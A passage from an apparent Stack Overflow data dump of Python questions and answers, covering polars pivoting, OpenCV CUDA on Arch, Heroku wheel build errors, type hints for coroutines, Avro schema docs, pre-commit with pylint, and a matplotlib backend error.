│ 4   ┆ cat/dog/aardvark/mouse/frog ┆ aardvark  │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 4   ┆ cat/dog/aardvark/mouse/frog ┆ mouse     │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 4   ┆ cat/dog/aardvark/mouse/frog ┆ frog      │
└─────┴─────────────────────────────┴───────────┘
</code></pre>
<p>In the next step, we're going to generate our column names.  I chose to call each column <code>string_XX</code> where <code>XX</code> is the offset with regards to the original string.</p>
<p>I've used the handy <a href=""https://pola-rs.github.io/polars/py-polars/html/reference/api/polars.internals.expr.string.ExprStringNameSpace.zfill.html"" rel=""noreferrer""><code>zfill</code></a> expression so that <code>1</code> becomes <code>01</code>.  (This makes sure that <code>string_02</code> comes before <code>string_10</code> if you decide to sort your columns later.)</p>
<p>You can substitute your own naming in this step as you need.</p>
<pre class=""lang-py prettyprint-override""><code>(
    df
    .with_row_count('id')
    .with_column(pl.col(&quot;my_str&quot;).str.split(&quot;/&quot;).alias(&quot;split_str&quot;))
    .explode(&quot;split_str&quot;)
    .with_column(
        (&quot;string_&quot; + pl.arange(0, pl.count()).cast(pl.Utf8).str.zfill(2))
        .over(&quot;id&quot;)
        .alias(&quot;col_nm&quot;)
    )
)
</code></pre>
<pre><code>shape: (10, 4)
┌─────┬─────────────────────────────┬───────────┬───────────┐
│ id  ┆ my_str                      ┆ split_str ┆ col_nm    │
│ --- ┆ ---                         ┆ ---       ┆ ---       │
│ u32 ┆ str                         ┆ str       ┆ str       │
╞═════╪═════════════════════════════╪═══════════╪═══════════╡
│ 0   ┆ cat                         ┆ cat       ┆ string_00 │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 1   ┆ cat/dog                     ┆ cat       ┆ string_00 │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 1   ┆ cat/dog                     ┆ dog       ┆ string_01 │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 2   ┆ null                        ┆ null      ┆ string_00 │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 3   ┆                             ┆           ┆ string_00 │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 4   ┆ cat/dog/aardvark/mouse/frog ┆ cat       ┆ string_00 │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 4   ┆ cat/dog/aardvark/mouse/frog ┆ dog       ┆ string_01 │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 4   ┆ cat/dog/aardvark/mouse/frog ┆ aardvark  ┆ string_02 │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 4   ┆ cat/dog/aardvark/mouse/frog ┆ mouse     ┆ string_03 │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 4   ┆ cat/dog/aardvark/mouse/frog ┆ frog      ┆ string_04 │
└─────┴─────────────────────────────┴───────────┴───────────┘
</code></pre>
<p>In the next step, we'll use the <a href=""https://pola-rs.github.io/polars/py-polars/html/reference/api/polars.DataFrame.pivot.html"" rel=""noreferrer""><code>pivot</code></a> function to place each string in its own column.</p>
<pre class=""lang-py prettyprint-override""><code>(
    df
    .with_row_count('id')
    .with_column(pl.col(&quot;my_str&quot;).str.split(&quot;/&quot;).alias(&quot;split_str&quot;))
    .explode(&quot;split_str&quot;)
    .with_column(
        (&quot;string_&quot; + pl.arange(0, pl.count()).cast(pl.Utf8).str.zfill(2))
        .over(&quot;id&quot;)
        .alias(&quot;col_nm&quot;)
    )
    .pivot(
        index=['id', 'my_str'],
        values='split_str',
        columns='col_nm',
    )
)
</code></pre>
<pre><code>shape: (5, 7)
┌─────┬─────────────────────────────┬───────────┬───────────┬───────────┬───────────┬───────────┐
│ id  ┆ my_str                      ┆ string_00 ┆ string_01 ┆ string_02 ┆ string_03 ┆ string_04 │
│ --- ┆ ---                         ┆ ---       ┆ ---       ┆ ---       ┆ ---       ┆ ---       │
│ u32 ┆ str                         ┆ str       ┆ str       ┆ str       ┆ str       ┆ str       │
╞═════╪═════════════════════════════╪═══════════╪═══════════╪═══════════╪═══════════╪═══════════╡
│ 0   ┆ cat                         ┆ cat       ┆ null      ┆ null      ┆ null      ┆ null      │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 1   ┆ cat/dog                     ┆ cat       ┆ dog       ┆ null      ┆ null      ┆ null      │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 2   ┆ null                        ┆ null      ┆ null      ┆ null      ┆ null      ┆ null      │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 3   ┆                             ┆           ┆ null      ┆ null      ┆ null      ┆ null      │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 4   ┆ cat/dog/aardvark/mouse/frog ┆ cat       ┆ dog       ┆ aardvark  ┆ mouse     ┆ frog      │
└─────┴─────────────────────────────┴───────────┴───────────┴───────────┴───────────┴───────────┘
</code></pre>
<p>All that remains is to use <a href=""https://pola-rs.github.io/polars/py-polars/html/reference/api/polars.Expr.fill_null.html"" rel=""noreferrer""><code>fill_null</code></a> to replace the <code>null</code> values with an empty string <code>&quot;&quot;</code>.  Notice that I've used a regex expression in the <a href=""https://pola-rs.github.io/polars/py-polars/html/reference/api/polars.col.html"" rel=""noreferrer""><code>col</code></a> expression to target only those columns whose names start with &quot;string_&quot;.  (Depending on your other data, you may not want to replace null with <code>&quot;&quot;</code> everywhere in your data.)</p>
"
"73143854","1","Linking opencv-python to opencv-cuda in Arch","<p>I'm trying to to get OpenCV with CUDA to be used in Python open-cv on Arch Linux, but I'm not sure how to link it.</p>
<p>Arch provides a package <a href=""https://archlinux.org/packages/extra/x86_64/opencv-cuda/"" rel=""noreferrer"">opencv-cuda</a>, which provides <a href=""https://archlinux.org/packages/extra/x86_64/opencv-cuda/files/"" rel=""noreferrer"">these files</a>.</p>
<p>Guides I've found said to link the python cv2.so to the one provided, but the package doesn't provide that. My python <code>site_packages</code> has <code>cv2.abi3.so</code> in it, and I've tried linking that to <code>core.so</code> and <code>cvv.so</code> to no avail.</p>
<p>Do I need to build it differently to support Python? Or is there another step I'm missing?</p>
","73227581","<p>On Arch, opencv-cuda <strong>provides</strong> <code>opencv=4.6.0</code>, but you still need the python bindings. Fortunately though, installing <code>python-opencv</code> after installling <code>opencv-cuda</code> works, since it leverages it.</p>
<p>I just set up my Python virtual environment to allow system site packages (<code>python -m venv .venv --system-site-packages</code>), and it works like a charm! Neural net image detection runs ~300% as fast now.</p>
"
"71712258","1","ERROR: Could not build wheels for backports.zoneinfo, which is required to install pyproject.toml-based projects","<p>The Heroku Build is returning this error when I'm trying to deploy a Django application for the past few days. The Django Code and File Structure are the same as Django's Official Documentation and Procfile is added in the root folder.</p>
<p>Log -</p>
<pre><code>-----&gt; Building on the Heroku-20 stack
-----&gt; Determining which buildpack to use for this app
-----&gt; Python app detected
-----&gt; No Python version was specified. Using the buildpack default: python-3.10.4
       To use a different version, see: https://devcenter.heroku.com/articles/python-runtimes
       Building wheels for collected packages: backports.zoneinfo
         Building wheel for backports.zoneinfo (pyproject.toml): started
         Building wheel for backports.zoneinfo (pyproject.toml): finished with status 'error'
         ERROR: Command errored out with exit status 1:
          command: /app/.heroku/python/bin/python /app/.heroku/python/lib/python3.10/site-packages/pip/_vendor/pep517/in_process/_in_process.py build_wheel /tmp/tmpqqu_1qow
              cwd: /tmp/pip-install-txfn1ua9/backports-zoneinfo_a462ef61051d49e7bf54e715f78a34f1
         Complete output (41 lines):
         running bdist_wheel
         running build
         running build_py
         creating build
         creating build/lib.linux-x86_64-3.10
         creating build/lib.linux-x86_64-3.10/backports
         copying src/backports/__init__.py -&gt; build/lib.linux-x86_64-3.10/backports
         creating build/lib.linux-x86_64-3.10/backports/zoneinfo
         copying src/backports/zoneinfo/_zoneinfo.py -&gt; build/lib.linux-x86_64-3.10/backports/zoneinfo
         copying src/backports/zoneinfo/_tzpath.py -&gt; build/lib.linux-x86_64-3.10/backports/zoneinfo
         copying src/backports/zoneinfo/_common.py -&gt; build/lib.linux-x86_64-3.10/backports/zoneinfo
         copying src/backports/zoneinfo/_version.py -&gt; build/lib.linux-x86_64-3.10/backports/zoneinfo
         copying src/backports/zoneinfo/__init__.py -&gt; build/lib.linux-x86_64-3.10/backports/zoneinfo
         running egg_info
         writing src/backports.zoneinfo.egg-info/PKG-INFO
         writing dependency_links to src/backports.zoneinfo.egg-info/dependency_links.txt
         writing requirements to src/backports.zoneinfo.egg-info/requires.txt
         writing top-level names to src/backports.zoneinfo.egg-info/top_level.txt
         reading manifest file 'src/backports.zoneinfo.egg-info/SOURCES.txt'
         reading manifest template 'MANIFEST.in'
         warning: no files found matching '*.png' under directory 'docs'
         warning: no files found matching '*.svg' under directory 'docs'
         no previously-included directories found matching 'docs/_build'
         no previously-included directories found matching 'docs/_output'
         adding license file 'LICENSE'
         adding license file 'licenses/LICENSE_APACHE'
         writing manifest file 'src/backports.zoneinfo.egg-info/SOURCES.txt'
         copying src/backports/zoneinfo/__init__.pyi -&gt; build/lib.linux-x86_64-3.10/backports/zoneinfo
         copying src/backports/zoneinfo/py.typed -&gt; build/lib.linux-x86_64-3.10/backports/zoneinfo
         running build_ext
         building 'backports.zoneinfo._czoneinfo' extension
         creating build/temp.linux-x86_64-3.10
         creating build/temp.linux-x86_64-3.10/lib
         gcc -pthread -Wno-unused-result -Wsign-compare -DNDEBUG -g -fwrapv -O3 -Wall -fPIC -I/app/.heroku/python/include/python3.10 -c lib/zoneinfo_module.c -o build/temp.linux-x86_64-3.10/lib/zoneinfo_module.o -std=c99
         lib/zoneinfo_module.c: In function ‘zoneinfo_fromutc’:
         lib/zoneinfo_module.c:600:19: error: ‘_PyLong_One’ undeclared (first use in this function); did you mean ‘_PyLong_New’?
           600 |             one = _PyLong_One;
               |                   ^~~~~~~~~~~
               |                   _PyLong_New
         lib/zoneinfo_module.c:600:19: note: each undeclared identifier is reported only once for each function it appears in
         error: command '/usr/bin/gcc' failed with exit code 1
         ----------------------------------------
         ERROR: Failed building wheel for backports.zoneinfo
       Failed to build backports.zoneinfo
       ERROR: Could not build wheels for backports.zoneinfo, which is required to install pyproject.toml-based projects
 !     Push rejected, failed to compile Python app.
 !     Push failed
</code></pre>
<p>Thanks.</p>
","72796492","<p>Avoid installing <code>backports.zoneinfo</code> when using <strong>python &gt;= 3.9</strong></p>
<p>Edit your <code>requirements.txt</code> file</p>
<p><strong>FROM:</strong></p>
<pre><code>backports.zoneinfo==0.2.1
</code></pre>
<p><strong>TO:</strong></p>
<pre><code>backports.zoneinfo;python_version&lt;&quot;3.9&quot;
</code></pre>
<p><strong>OR:</strong></p>
<pre><code>backports.zoneinfo==0.2.1;python_version&lt;&quot;3.9&quot;
</code></pre>
<p>You can read more about this <a href=""https://pypi.org/project/backports.zoneinfo/"" rel=""noreferrer"">here</a> and <a href=""https://peps.python.org/pep-0508/#environment-markers"" rel=""noreferrer"">here</a></p>
"
"72504576","1","Why use `from module import A as A` instead of just `from module import A`","<p>When reading source code of fastapi, this line make me fuzzy:</p>
<pre class=""lang-py prettyprint-override""><code>from starlette.testclient import TestClient as TestClient
</code></pre>
<p>Why not just: <code>from starlette.testclient import TestClient</code>?</p>
","73712178","<p>From the point of view of executable code, there is absolutely no difference in terms of the Python bytecode being generated by the two different code examples (using Python 3.9):</p>
<pre><code>&gt;&gt;&gt; dis.dis('from starlette.testclient import TestClient as TestClient')
  1           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (('TestClient',))
              4 IMPORT_NAME              0 (starlette.testclient)
              6 IMPORT_FROM              1 (TestClient)
              8 STORE_NAME               1 (TestClient)
             10 POP_TOP
             12 LOAD_CONST               2 (None)
             14 RETURN_VALUE
&gt;&gt;&gt; dis.dis('from starlette.testclient import TestClient')
  1           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (('TestClient',))
              4 IMPORT_NAME              0 (starlette.testclient)
              6 IMPORT_FROM              1 (TestClient)
              8 STORE_NAME               1 (TestClient)
             10 POP_TOP
             12 LOAD_CONST               2 (None)
             14 RETURN_VALUE
</code></pre>
<p>As shown, they are exactly identical. (Related <a href=""https://stackoverflow.com/questions/22245711/from-import-or-import-as-for-modules"">thread</a> and <a href=""https://stackoverflow.com/questions/50943230/what-is-the-difference-between-import-a-b-as-b-and-from-a-import-b-in-python"">thread</a>.)</p>
<p>However, <a href=""https://stackoverflow.com/questions/72504576/why-use-from-module-import-a-as-a-instead-of-just-from-module-import-a#comment128825307_72504576"">the comment by Graham501617</a> noted how modern type hinting validators (such as <code>mypy</code>) accept this particular syntax to denote the re-export of that imported name (the other being the <a href=""https://github.com/python/mypy/issues/7042"" rel=""nofollow noreferrer""><code>__all__</code></a>, which thankfully they did end up correctly supporting as that has been a <a href=""https://stackoverflow.com/questions/44834/what-does-all-mean-in-python"">standard syntax to denote symbols to (re-)export since Python 2</a>).  Specifically, as per the description of <a href=""https://peps.python.org/pep-0484/#stub-files"" rel=""nofollow noreferrer"">Stub Files</a> in the referenced PEP 0484, quote:</p>
<blockquote>
<ul>
<li>Modules and variables imported into the stub are not considered exported from the stub unless the import uses the <code>import ... as ...</code> form or the equivalent <code>from ... import ... as ...</code> form. (UPDATE: To clarify, the intention here is that only names imported using the form <code>X as X</code> will be exported, i.e. the name before and after as must be the same.)</li>
</ul>
</blockquote>
<p>Which means the library is likely following that particular convention to facilitate the re-export of the <code>TestClient</code> name from the stub (module) file that was referenced in the question.  As a matter of fact, looking at <a href=""https://github.com/tiangolo/fastapi/blame/22528373bba6a654323de416ad5c867cbadb81bb/fastapi/testclient.py"" rel=""nofollow noreferrer""><code>git blame</code></a> for the relevant file in the packages pointed to <a href=""https://github.com/tiangolo/fastapi/commit/fdb6c9ccc504f90afd0fbcec53f3ea0bfebc261a"" rel=""nofollow noreferrer"">this commit</a> (<a href=""https://github.com/tiangolo/fastapi/commit/fdb6c9ccc504f90afd0fbcec53f3ea0bfebc261a#diff-d8022eeae6cbeb462b6b560dd094399052441734772d7fc7fee1d0058c5e20a4"" rel=""nofollow noreferrer"">direct link to relevant diff for the file</a>) which referenced <a href=""https://github.com/tiangolo/fastapi/pull/2547"" rel=""nofollow noreferrer"">this issue</a>, which contains a similar brief discussion to address the exact type hinting issue; this was done to ensure mypy will treat those imported names as re-export, thus allowing the usage of the <a href=""https://mypy.readthedocs.io/en/stable/command_line.html#cmdoption-mypy-no-implicit-reexport"" rel=""nofollow noreferrer""><code>--no-implicit-reexport</code></a> flag (which <a href=""https://mypy.readthedocs.io/en/stable/command_line.html#cmdoption-mypy-strict"" rel=""nofollow noreferrer""><code>--strict</code></a> has likely implicitly enabled).</p>
"
"73240620","1","The right way to type hint a Coroutine function?","<p>I cannot wrap my head around type hinting a <code>Coroutine</code>. As far as I understand, when we declare a function like so:</p>
<pre><code>async def some_function(arg1: int, arg2: str) -&gt; list:
    ...
</code></pre>
<p>we <strong>effectively</strong> declare a function, which returns a coroutine, which, when awaited, returns a list. So, the way to type hint it would be:</p>
<pre><code>f: Callable[[int, str], Coroutine[???]] = some_function
</code></pre>
<p>But <code>Coroutine</code> generic type has 3 arguments! We can see it if we go to the <code>typing.py</code> file:</p>
<pre><code>...
Coroutine = _alias(collections.abc.Coroutine, 3)
...
</code></pre>
<p>There is also <code>Awaitable</code> type, which <strong>logically</strong> should be a parent of <code>Coroutine</code> with only one generic parameter (the return type, I suppose):</p>
<pre><code>...
Awaitable = _alias(collections.abc.Awaitable, 1)
...
</code></pre>
<p>So maybe it would be more or less correct to type hint the function this way:</p>
<pre><code>f: Callable[[int, str], Awaitable[list]] = some_function
</code></pre>
<p>Or is it?</p>
<p>So, basically, the questions are:</p>
<ol>
<li>Can one use <code>Awaitable</code> instead of <code>Coroutine</code> in the case of type hinting an <code>async def</code> function?</li>
<li>What are the correct parameters for the <code>Coroutine</code> generic type and what are its use-cases?</li>
</ol>
","73240734","<p>As the <a href=""https://docs.python.org/3/library/collections.abc.html#collections.abc.Awaitable"" rel=""noreferrer"">docs</a> state:</p>
<blockquote>
<p><code>Coroutine</code> objects and instances of the <code>Coroutine</code> ABC are all instances of the <code>Awaitable</code> ABC.</p>
</blockquote>
<p>And for the <code>Coroutine</code> type:</p>
<blockquote>
<p>A generic version of <code>collections.abc.Coroutine</code>. The variance and order of type variables correspond to those of <code>Generator</code>.</p>
</blockquote>
<p><code>Generator</code> in turn has the signature <code>Generator[YieldType, SendType, ReturnType]</code>. So if you want to preserve that type information, use <code>Coroutine</code>, otherwise <code>Awaitable</code> should suffice.</p>
"
"73075669","1","How to extract doc from avro data and add it to dataframe","<p>I'm trying to create hive/impala tables base on avro files in HDFS. The tool for doing the transformations is Spark.</p>
<p>I can't use <code>spark.read.format(&quot;avro&quot;)</code> to load the data into a dataframe, as in that way the <code>doc</code> part (description of the column) will be lost. I can see the doc by doing:</p>
<pre><code> input = sc.textFile(&quot;/path/to/avrofile&quot;)
 avro_schema = input.first() # not sure what type it is 
</code></pre>
<p>The problem is, it's a nested schema and I'm not sure how to traverse it to map the <code>doc</code> to the column description in dataframe. I'd like to have <code>doc</code> to the column description of the table. For example, the input schema looks like:</p>
<pre><code>&quot;fields&quot;: [
    {
     &quot;name&quot;:&quot;productName&quot;,
     &quot;type&quot;: [
       &quot;null&quot;,
       &quot;string&quot;
      ],
     &quot;doc&quot;: &quot;Real name of the product&quot;
     &quot;default&quot;: null
    },
    {
     &quot;name&quot; : &quot;currentSellers&quot;,
     &quot;type&quot;: [
        &quot;null&quot;,
        {
         &quot;type&quot;: &quot;record&quot;,
         &quot;name&quot;: &quot;sellers&quot;,
         &quot;fields&quot;:[
             {
              &quot;name&quot;: &quot;location&quot;,
              &quot;type&quot;:[
                 &quot;null&quot;,
                  {
                   &quot;type&quot;: &quot;record&quot;
                   &quot;name&quot;: &quot;sellerlocation&quot;,
                   &quot;fields&quot;: [
                      {
                       &quot;name&quot;:&quot;locationName&quot;,
                       &quot;type&quot;: [
                           &quot;null&quot;,
                           &quot;string&quot;
                         ],
                       &quot;doc&quot;: &quot;Name of the location&quot;,
                       &quot;default&quot;:null
                       },
                       {
                       &quot;name&quot;:&quot;locationArea&quot;,
                       &quot;type&quot;: [
                           &quot;null&quot;,
                           &quot;string&quot;
                         ],
                       &quot;doc&quot;: &quot;Area of the location&quot;,#The comment needs to be added to table comments
                       &quot;default&quot;:null
                         .... #These are nested fields 
</code></pre>
<p>In the final table, for example one field name would be <code>currentSellers_locationName</code>, with column description &quot;Name of the location&quot;. Could someone please help to shed some light on how to parse the schema and add the doc to description? and explain a bit about what this below bit is about outside of the fields? Many thanks. Let me know if I can explain it better.</p>
<pre><code>         &quot;name&quot; : &quot;currentSellers&quot;,
     &quot;type&quot;: [
        &quot;null&quot;,
        {
         &quot;type&quot;: &quot;record&quot;,
         &quot;name&quot;: &quot;sellers&quot;,
         &quot;fields&quot;:[
             {
  
</code></pre>
","73258076","<p>If you would like to parse the schema yourself and manually add metadata to spark, I would suggest <code>flatdict</code> package:</p>
<pre><code>from flatdict import FlatterDict

flat_schema = FlatterDict(schema)  # schema as python dict

names = {k.replace(':name', ''): flat_schema[k] for k in flat_schema if k.endswith(':name')}
docs = {k.replace(':doc', ''): flat_schema[k] for k in flat_schema if k.endswith(':doc')}

# keep only keys which are present in both names and docs
keys_with_doc = set(names.keys()) &amp; set(docs.keys())

full_name = lambda key: '_'.join(
    names[k] for k in sorted(names, key=len) if key.startswith(k) and k.split(':')[-2] == 'fields'
)
name_doc_map = {full_name(k): docs[k] for k in keys_with_doc}
</code></pre>
<p>A typical set of keys in <code>flat_schema.keys()</code> is:</p>
<pre><code>'fields:1:type:1:fields:0:type:1:fields:0:type:1',
'fields:1:type:1:fields:0:type:1:fields:0:name',
'fields:1:type:1:fields:0:type:1:fields:0:default',
'fields:1:type:1:fields:0:type:1:fields:0:doc',
</code></pre>
<p>These strings can now be manipulated:</p>
<ol>
<li>extract only the ones ending with &quot;name&quot; and &quot;doc&quot; (ignore &quot;default&quot;, etc.)</li>
<li>get set intersection to remove the ones that do not have both fields present</li>
<li>get a list of all field names from higher levels of hierarchy: <code>fields:1:type:1:fields</code> is one of parents of <code>fields:1:type:1:fields:0:type:1:fields</code> (the condition is that they have the same start and they end with &quot;fields&quot;)</li>
</ol>
"
"72839263","1","Access python interpreter in VSCode version controll when using pre-commit","<p>I'm using pre-commit for most of my Python projects, and in many of them, I need to use pylint as a local repo. When I want to commit, I always have to activate python venv and then commit; otherwise, I'll get the following error:</p>
<pre class=""lang-bash prettyprint-override""><code>black....................................................................Passed
pylint...................................................................Failed
- hook id: pylint
- exit code: 1

Executable `pylint` not found
</code></pre>
<p>When I use vscode version control to commit, I get the same error; I searched about the problem and didn't find any solution to avoid the error in VSCode.</p>
<p>This is my typical <code>.pre-commit-config.yaml</code>:</p>
<pre class=""lang-yaml prettyprint-override""><code>repos:
-   repo: https://github.com/ambv/black
    rev: 21.9b0
    hooks:
    - id: black
      language_version: python3.8
      exclude: admin_web/urls\.py
-   repo: local
    hooks:
    -   id: pylint
        name: pylint
        entry: pylint
        language: python
        types: [python]
        args: 
         - --rcfile=.pylintrc

</code></pre>
","72839338","<p>you have ~essentially two options here -- neither are great (<code>language: system</code> is kinda the unsupported escape hatch so it's on you to make those things available on <code>PATH</code>)</p>
<p>you could use a specific path to the virtualenv <code>entry: venv/bin/pylint</code> -- though that will reduce the portability.</p>
<p>or you could start vscode with your virtualenv activated (usually <code>code .</code>) -- this doesn't always work if vscode is already running</p>
<hr />
<p>disclaimer: I created pre-commit</p>
"
"73271404","1","How to find the average of the differences between all the numbers of a Python List","<p>I have a python list like this,</p>
<pre><code>arr = [110, 60, 30, 10, 5] 
</code></pre>
<p>What I need to do is actually find the difference of every number with all the other numbers and then find the average of all those differences.</p>
<p>So, for this case, it would first find the difference between <code>110</code> and then all the remaining elements, i.e. <code>60, 30, 10, 5</code>, and then it will find the difference of <code>60</code> with the remaining elements, i.e. <code>30, 10, 5</code> and etc.</p>
<p>After which, it will compute the Average of all these differences.</p>
<p>Now, this can easily be done with two For Loops but in <code>O(n^2)</code> time complexity and also a little bit of &quot;messy&quot; code. I was wondering if there was a faster and more efficient way of doing this same thing?</p>
","73271447","<p>I'll just give the formula first:</p>
<pre><code>n = len(arr)
out = np.sum(arr * np.arange(n-1, -n, -2) ) / (n*(n-1) / 2)
# 52
</code></pre>
<p>Explanation: You want to find the mean of</p>
<pre><code>a[0] - a[1], a[0] - a[2],..., a[0] - a[n-1]
             a[1] - a[2],..., a[1] - a[n-1]
                         ...
</code></pre>
<p>there, your</p>
<pre><code>`a[0]` occurs `n-1` times with `+` sign, `0` with `-` -&gt; `n-1` times
`a[1]` occurs `n-2` times with `+` sign, `1` with `-` -&gt; `n-3` times
... and so on 
</code></pre>
"
"72497046","1","skipping a certain range of a list at time in python","<p>I have a array, I want to pick first 2 or range, skip the next 2, pick the next 2 and continue this until the end of the list</p>
<pre><code>list = [2, 4, 6, 7, 9,10, 13, 11, 12,2]
results_wanted = [2,4,9,10,12,2] # note how it skipping 2. 2 is used here as and example
</code></pre>
<p>Is there way to achieve this in python?</p>
","72497107","<p>Taking <code>n</code> number of elements and skipping the next <code>n</code>.</p>
<pre class=""lang-py prettyprint-override""><code>l = [2, 4, 6, 7, 9, 10, 13, 11, 12, 2]
n = 2
wanted = [x for i in range(0, len(l), n + n) for x in l[i: i + n]]
### Output : [2, 4, 9, 10, 12, 2]
</code></pre>
"
"73749995","1","Why does Matplotlib 3.6.0 on MacOS throw an `AttributeError` when showing a plot?","<p>I have the following straightforward code:</p>
<pre><code>import matplotlib.pyplot as plt
x = [1,2,3,4]
y = [34, 56, 78, 21]
plt.plot(x, y)
plt.show()
</code></pre>
<p>But after changing my MacBook Pro to the M1 chip, I'm getting the following error:</p>
<pre><code>Traceback (most recent call last):
  File &quot;/Users/freddy/PycharmProjects/TPMetodosNoParametricos/main.py&quot;, line 291, in &lt;module&gt;
    plt.plot(x, y)
  File &quot;/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py&quot;, line 2728, in plot
    return gca().plot(
  File &quot;/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py&quot;, line 2225, in gca
    return gcf().gca()
  File &quot;/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py&quot;, line 830, in gcf
    return figure()
  File &quot;/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/_api/deprecation.py&quot;, line 454, in wrapper
    return func(*args, **kwargs)
  File &quot;/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py&quot;, line 771, in figure
    manager = new_figure_manager(
  File &quot;/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py&quot;, line 346, in new_figure_manager
    _warn_if_gui_out_of_main_thread()
  File &quot;/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py&quot;, line 336, in _warn_if_gui_out_of_main_thread
    if (_get_required_interactive_framework(_get_backend_mod()) and
  File &quot;/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py&quot;, line 206, in _get_backend_mod
    switch_backend(dict.__getitem__(rcParams, &quot;backend&quot;))
  File &quot;/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py&quot;, line 266, in switch_backend
    canvas_class = backend_mod.FigureCanvas
AttributeError: module 'backend_interagg' has no attribute 'FigureCanvas'
</code></pre>
<p>Why does the code throw this error?</p>
<p>My matplotlib version is 3.6.0</p>
","73755442","<p>i had the same problem today on a different machine in the same matplotlib version. I downgrade to Version 3.5.0 and now it works.</p>
"
"72409563","1","Unsupported hash type ripemd160 with hashlib in Python","<p>After a thorough search, I have not found a complete explanation and solution to this very common problem on the entire web. All scripts that need to encode with hashlib give me error:</p>
<p><strong>Python 3.10</strong></p>
<pre><code>import hashlib
h = hashlib.new('ripemd160')
</code></pre>
<p>return:</p>
<pre><code>Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;/usr/lib/python3.10/hashlib.py&quot;, line 166, in __hash_new
    return __get_builtin_constructor(name)(data)
